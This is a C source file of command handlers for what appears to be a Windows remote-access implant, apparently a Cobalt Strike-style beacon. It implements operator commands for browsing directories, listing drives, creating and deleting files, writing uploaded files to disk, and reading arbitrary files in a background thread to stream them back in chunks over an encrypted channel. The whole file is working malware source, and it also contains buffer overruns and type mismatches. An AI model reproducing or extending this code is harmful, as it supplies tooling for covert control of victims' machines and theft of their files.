#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include "Command.h"
#pragma warning(disable:4996)
#define PATH_MAX 4096
#define MAX_PATH_LENGTH 1048
#define MAX_TIME_STRING_LENGTH 50
extern unsigned char AESRandaeskey[16];
extern int Counter;


unsigned char* getFormattedTime(time_t modTime) {
    unsigned char* timeStr = (unsigned char*)malloc(20 * sizeof(unsigned char)); // Allocate memory for time string
    struct tm* tm_info;
    tm_info = localtime(&modTime);
    strftime((char*)timeStr, 20, "%d/%m/%Y %H:%M:%S", tm_info);
    return timeStr;
}
wchar_t* convertToWideChar(const unsigned char* input) {
    int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
    if (len == 0) {
        perror("MultiByteToWideChar failed");
        return NULL;
    }

    wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (wideStr == NULL) {
        perror("Memory allocation failed");
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
        perror("MultiByteToWideChar failed");
        free(wideStr);
        return NULL;
    }

    return wideStr;
}
unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
    if (!wideStr) return NULL;

    int utf8Len = wcstombs(NULL, wideStr, 0);
    if (utf8Len <= 0) return NULL;

    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len + 1);
    if (!utf8Str) return NULL;

    wcstombs((char*)utf8Str, wideStr, utf8Len);
    utf8Str[utf8Len] = '\0';

    return utf8Str;
}
unsigned char* listDirectory(unsigned char* dirPathy , size_t* dirPathStrlen) {
    
    setlocale(LC_ALL, "");
    wchar_t* path = convertToWideChar(dirPathy);
    struct _wfinddata_t file_info;
    intptr_t handle;
    wchar_t search_path[MAX_PATH_LENGTH];
    size_t len = wcslen(path);
    if (len > 0 && path[len - 1] == L'/') {
        path[len - 1] = L'\0';
    }
    swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);

    if ((handle = _wfindfirst(search_path, &file_info)) == -1L) {
        wprintf(L"无法打开目录: %s\n", path);
        wcscpy(search_path, L"C:\\*");
        handle = _wfindfirst(search_path, &file_info);
        
    }

    wchar_t resultStr[PATH_MAX];
    resultStr[0] = L'\0'; // Ensure the string is initially empty

    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"%s", search_path);
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L".");
    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L"..");
    wchar_t timeString[MAX_TIME_STRING_LENGTH];
    do {
        if (wcscmp(file_info.name, L".") != 0 && wcscmp(file_info.name, L"..") != 0) {
            if (file_info.attrib & _A_SUBDIR) {
                // Directory
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                // Format time as a string and store it in timeString
                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", timeString,file_info.name);
            }
            else {
                // File
                time_t modified_time = (time_t)file_info.time_write;
                struct tm* timeinfo = localtime(&modified_time);

                // Format time as a string and store it in timeString
                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nF\t%lld\t%s\t%s",file_info.size , timeString ,file_info.name);
               
            }
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);

    wprintf(L"文件和目录信息:\n%s\n", resultStr);
    unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
    *dirPathStrlen = strlen(resultStrchar);
    return resultStrchar;
}
unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* lenn) {
    uint8_t pendingRequest[4];
    uint8_t dirPathLenBytes[4];
    unsigned char* pendingRequeststart = commandBuf;
    unsigned char* dirPathLenBytesstart = commandBuf + 4;
    memcpy(pendingRequest, pendingRequeststart, 4);
    memcpy(dirPathLenBytes, dirPathLenBytesstart, 4);
    uint32_t dirPathLen = bigEndianUint32(dirPathLenBytes);
    unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
    unsigned char* dirPathBytesstart = commandBuf + 8;
    memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
    dirPathBytes[dirPathLen] = '\0';
    

 
    unsigned char*  dirPathStr = str_replace_all(dirPathBytes, "*", "");
    
    unsigned char* dirPathStr11[] = {0x2e,0x2f};

    if (*dirPathStr == *dirPathStr11) {
        char cwd[PATH_MAX];
        if (getcwd(cwd, sizeof(cwd)) == NULL) {
            perror("getcwd");
            return EXIT_FAILURE;
        }

        unsigned char* relativePath = ""; // 相对路径
        char absolutePath[PATH_MAX];
        snprintf(absolutePath, sizeof(absolutePath), "%s/%s", cwd, relativePath);
        dirPathStr = absolutePath;
        printf("绝对路径: %s\n", absolutePath);
    }
    else
    {
        dirPathStr = str_replace_all(dirPathStr, "/", "\\");

        
       
    }
    printf("dirPathStr %s\n", dirPathStr);
    size_t dirPathStrlen;
    

    unsigned char* result = listDirectory(dirPathStr,&dirPathStrlen);
    if (result != NULL) {
        printf("%s\n", result);
        // Free memory allocated for result string
    }

    
    uint8_t* result8 = (uint8_t*)result;
    uint8_t* metaInfoBytes[] = { pendingRequest, result8 };
    size_t metaInfosizes[] = { 4,dirPathStrlen };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }
    if (metaInfoconcatenated != NULL) {
        printf("metaInfoconcatenated Byte Stream: ");
       
    }
    printf("%s\n", metaInfoconcatenated);
    int callbackType = 0;
    *lenn = metaInfoSize;

    return metaInfoconcatenated;
    
    
}

unsigned char* parseUpload(unsigned char* commandBuf,size_t* commandBuflen, size_t* lenn,int chunkNumber) {
    //printf("commandBuf %d \n", commandBuflen);
    uint8_t filePathLenBytes[4];
    unsigned char* filePathLenstart = commandBuf;
    
    memcpy(filePathLenBytes, filePathLenstart, 4);
    /*printf("filePathLenBytes \n"); 
    for (size_t i = 0; i < 4; ++i) {
        printf("0x%0x,, ", filePathLenBytes[i]);
    }
    printf("\n");*/
    uint32_t filePathLen = bigEndianUint32(filePathLenBytes);
    unsigned char* filePath = (unsigned char*)malloc(filePathLen);
    filePath[filePathLen] = '\0';
    unsigned char* filePathstart = commandBuf+4;
    memcpy(filePath, filePathstart, filePathLen);
    printf("filePath  %d\n",filePathLen);
    for (size_t i = 0; i < filePathLen; ++i) {
        printf("0x%0x,, ", filePath[i]);
    }
    printf("%s  ", filePath);
    printf("\n");
    size_t fileContenthlen = (size_t)commandBuflen - 4 - (size_t)filePathLen;
    unsigned char* fileContenth = (unsigned char*)malloc(fileContenthlen);
    fileContenth[fileContenthlen] = '\0';
    unsigned char* fileContenthstart = commandBuf + filePathLen +4;

    unsigned char* chunk = (unsigned char*)malloc(1024);

    if (!chunk) {
        perror("Error allocating memory");
        return;
    }

    size_t bytesRead;
    size_t offset = 0;

    while (offset < (size_t)fileContenthlen) {
        size_t remaining = (size_t)fileContenthlen - offset;
        size_t chunkSize = remaining > 1024 ? 1024 : remaining;

        // 从 fileContenthstart 中读取 chunkSize 大小的数据
        memcpy(chunk, fileContenthstart + offset, chunkSize);

        Upload(filePath, chunk, chunkSize, chunkNumber);

        offset += chunkSize;
        chunkNumber++;
    }

    unsigned char* Uploadstr = "success, the offset is: ";
    unsigned char offsetchar[20]; // 数字转字符串缓冲区
    sprintf(offsetchar, "%d", offset); // 将整数转换为字符串
    unsigned char* result = (unsigned char*)malloc(strlen(offsetchar)+strlen(Uploadstr));
    result[strlen(offsetchar) + strlen(Uploadstr)]='\0';
    

    memcpy(result, Uploadstr,strlen(Uploadstr));
    memcpy(result + strlen(Uploadstr), offsetchar, strlen(offsetchar));
    *lenn = strlen(offsetchar) + strlen(Uploadstr);
    return result;

}
int Upload(const unsigned char* filePath, const unsigned char* fileContent, size_t contentSize, int isStart) {
    FILE* fp;
    const char* mode;
    
    if (isStart == 1) {
        // 如果文件存在，需要用户在上传前手动删除它
        mode = "wb"; // 以二进制写入模式打开文件，如果文件存在则截断内容
    }
    else {
        mode = "ab"; // 以追加二进制写入模式打开文件
    }

    fp = fopen(filePath, mode);
    if (fp == NULL) {
        perror("File open error");
        return -1;
    }

    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), contentSize, fp);
    if (bytesWritten != contentSize) {
        perror("File write error");
        fclose(fp);
        return -1;
    }

    fclose(fp);
    return (int)bytesWritten;
}
unsigned char* CmdDrives(unsigned char* commandBuf, size_t* Bufflen) {
    DWORD drives = GetLogicalDrives();
    unsigned char drives2[20];
    sprintf(drives2, "%d", drives);

    unsigned char* result = (unsigned char*)malloc(strlen(drives2));
    result[strlen(drives2)]='\0';
    memcpy(result, drives2, strlen(drives2));
    uint8_t command[4];
    memcpy(command, commandBuf,4);


    uint8_t* metaInfoBytes[] = { command, result };
    size_t metaInfosizes[] = { 4,strlen(result) };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }
    *Bufflen = metaInfoSize;
    return metaInfoconcatenated;

}
unsigned char* cmdMkdir(unsigned char* cmdBuf,size_t* commandBuflen, size_t* Bufflen) {

    // Create directory with read, write, and execute permissions for user,
    // read, write, and execute permissions for group, and read and execute
    // permissions for others.
    cmdBuf[(size_t)commandBuflen] = '\0';
    if (mkdir(cmdBuf, 0777) != 0) {
        perror("Error creating directory");
        
    }
    unsigned char* Mkdirstr = "Mkdir success: ";
    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr)+ commandBuflen);
    memcpy(result, Mkdirstr, strlen(Mkdirstr));
    memcpy(result+ strlen(Mkdirstr), cmdBuf, commandBuflen);
    
    *Bufflen = strlen(Mkdirstr) + (size_t)commandBuflen;
    return result;
}
unsigned char* fileRemove(unsigned char* cmdBuf, size_t* commandBuflen, size_t* Bufflen) {
    cmdBuf[(size_t)commandBuflen] = '\0';
    struct stat path_stat;
    stat(cmdBuf, &path_stat);
    if (S_ISDIR(path_stat.st_mode)) {
        rmdir(cmdBuf);
    }
    else {
        remove(cmdBuf);
    }
    
    remove(cmdBuf);
    unsigned char* Removestr = "Remove success: ";
    unsigned char* result = (unsigned char*)malloc(strlen(Removestr) + commandBuflen);
    memcpy(result, Removestr, strlen(Removestr));
    memcpy(result+ strlen(Removestr), cmdBuf, commandBuflen);

    *Bufflen = strlen(Removestr) + (size_t)commandBuflen;
    return result;
}
struct ThreadArgs {
    unsigned char* buf;
    size_t* commandBuflen;
    size_t* Bufflen;
};
DWORD WINAPI myThreadFunction(LPVOID lpParam) {
    // 在这里放置线程的逻辑代码
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* buf = args->buf;
    size_t* commandBuflen = args->commandBuflen;
    size_t* Bufflen = args->Bufflen;


    printf("%d", args->commandBuflen);
    struct stat fileInfo;
    args->buf[(size_t)args->commandBuflen] = '\0';
    stat(args->buf, &fileInfo);
    off_t fileLen = fileInfo.st_size;
    uint32_t fileLens = (uint32_t)fileLen;
    //GenerateEvenRandomInt
    uint8_t fileLenBytes[4];
    PutUint32BigEndian(fileLenBytes, fileLens);
    uint32_t rand = (uint32_t)GenerateEvenRandomInt(10000, 99999);
    uint8_t requestIDBytes[4];
    PutUint32BigEndian(requestIDBytes, rand);
    uint8_t* metaInfoBytes[] = { requestIDBytes, fileLenBytes,args->buf };
    size_t metaInfosizes[] = { 4,4,(size_t)args->commandBuflen };
    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
    uint8_t* metaInfoconcatenated = ConByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
    size_t metaInfoSize = 0;
    // 计算所有 sizeof 返回值的总和
    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
        metaInfoSize += metaInfosizes[i];
    }
    DataProcess(metaInfoconcatenated, metaInfoSize, 2);

    FILE* fileHandle = fopen(args->buf, "rb");
    if (fileHandle == NULL) {
        
        return;
    }

    char* fileBuf = malloc(1024 * 1024);
    if (fileBuf == NULL) {
        fclose(fileHandle);
        
        return;
    }
    
    size_t bytesRead;
    size_t resultSize = 0;
    while ((bytesRead = fread(fileBuf, 1, 1024 * 1024, fileHandle)) > 0) {
        // 在这里处理读取的文件内容
        uint8_t* metaInfoBytes1[] = { requestIDBytes, fileBuf };
        size_t metaInfosizes1[] = { 4,bytesRead };
        size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
        uint8_t* metaInfoconcatenated1 = ConByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
        size_t metaInfoSize1 = 0;
        // 计算所有 sizeof 返回值的总和
        for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
            metaInfoSize1 += metaInfosizes1[i];
        }
        //sprintf(result, "%08X%s", requestIDBytes, fileBuf);
       
        // 进行数据处理
        DataProcess(metaInfoconcatenated1, metaInfoSize1,8);
        resultSize += metaInfoSize1;
        if (resultSize > 1024 * 1024 * 10) {
            char metaInfoSize1String[20]; // Assuming a reasonable buffer size
            snprintf(metaInfoSize1String, sizeof(metaInfoSize1String), "%zu", resultSize);
            // Assign the string to a char*
            char* charPointer = strdup(metaInfoSize1String);
            char* jia = "[+] Dowload Size ";
            char* kong = " ";
            unsigned char* result = (unsigned char*)malloc(26+ (size_t)args->commandBuflen);
            memcpy(result, jia, 18); 
            memcpy(result+18, args->buf, (size_t)args->commandBuflen);
            memcpy(result + 18 + (size_t)args->commandBuflen, kong, 2);
            memcpy(result + 20+ (size_t)args->commandBuflen, charPointer, 8);
            DataProcess(result, 28+ (size_t)args->commandBuflen, 0);
            resultSize = 0;
        }
        

        // 休眠50毫秒
        // 注意：在真实应用中可能需要使用更精确的等待机制
        Sleep(50);
    }

    //fclose(fileHandle);
    //uint8_t* metaInfoBytes2[] = { requestIDBytes };
    //size_t metaInfosizes2[] = { 4 };
    //size_t metaInfoBytesArrays2 = sizeof(metaInfoBytes2) / sizeof(metaInfoBytes2[0]);
    //uint8_t* metaInfoconcatenated2 = ConByte(metaInfoBytes2, metaInfosizes2, metaInfoBytesArrays2);
    //size_t metaInfoSize2 = 0;
    //// 计算所有 sizeof 返回值的总和
    //for (size_t i = 0; i < sizeof(metaInfosizes2) / sizeof(metaInfosizes2[0]); ++i) {
    //    metaInfoSize2 += metaInfosizes2[i];
    //}
    unsigned char* requestIDByte = (unsigned char*)malloc(4);
    memcpy(requestIDByte, requestIDBytes,4);
    DataProcess(requestIDByte, 4, 9);

    return 0;
}
unsigned char* Download(unsigned char* buf, size_t* commandBuflen, size_t* Bufflen) {
    //pthread_t myThread;

    struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
    if (args == NULL) {
        // 处理内存分配失败的情况
        return NULL;
    }

    args->buf = buf;
    args->commandBuflen = commandBuflen;

    //// 创建线程
    //if (pthread_create(&myThread, NULL, myThreadFunction, &args) != 0) {
    //    fprintf(stderr, "Failed to create thread\n");
    //    return 1;
    //}
    //// 将线程设置为分离状态
    //if (pthread_detach(myThread) != 0) {
    //    fprintf(stderr, "Failed to detach thread\n");
    //    return 1;
    //}
    HANDLE myThread = CreateThread(
        NULL,                       // 默认线程安全性
        0,                          // 默认堆栈大小
        myThreadFunction,           // 线程函数
        args,                       // 传递给线程函数的参数
        0,                          // 默认创建标志
        NULL);                      // 不存储线程ID

    if (myThread == NULL) {
        fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
        return 1;
    }
    //WaitForSingleObject(myThread, INFINITE);

    // 关闭线程和事件句柄
    CloseHandle(myThread);
    unsigned char* Removestr = "[+] Downloading ";
    unsigned char* result = (unsigned char*)malloc(strlen(Removestr) + commandBuflen);
    memcpy(result, Removestr, strlen(Removestr));
    memcpy(result + strlen(Removestr), buf, commandBuflen);

    *Bufflen = strlen(Removestr) + (size_t)commandBuflen;


    return result;


}